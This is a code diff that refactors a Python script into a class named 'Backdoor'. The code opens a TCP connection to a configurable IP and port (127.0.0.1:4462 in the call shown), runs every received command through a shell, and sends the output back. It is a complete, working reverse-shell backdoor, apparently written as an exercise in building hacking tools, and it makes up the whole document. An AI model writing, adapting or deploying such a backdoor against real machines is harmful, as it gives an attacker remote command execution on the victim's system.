@@ -1,28 +1,36 @@
 
 import socket, subprocess
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        self.connection.send(b"\n[+] Connection Established.\n")
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("127.0.0.1", 4456))
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
-connection.send(b"\n[+] Connection Established.\n")
+    def close_connection(self):
+        self.connection.close()
 
-while True:
-    try:
-        received_command = connection.recv(1024)
-        #print(received_data)
-        command_result = execute_system_command(received_command)
-        connection.send(command_result)
+    def run(self):
+        while True:
+            try:
+                received_command = self.connection.recv(1024)
+                #print(received_data)
+                command_result = self.execute_system_command(received_command)
+                self.connection.send(command_result)
 
-    except ConnectionResetError:
-        pass
+            except ConnectionResetError:
+                pass
     
-    except KeyboardInterrupt:
-        print("[+] Detected CTRL + C.....Closing App....Please wait...")
-        connection.close()
-        exit()
+            except KeyboardInterrupt:
+                print("[+] Detected CTRL + C.....Closing App....Please wait...")
+                self.connection.close()
+                exit()
 
+#class end
 
-connection.close()
+my_backdoor = Backdoor("127.0.0.1", 4462)
+my_backdoor.run()
+my_backdoor.close_connection()
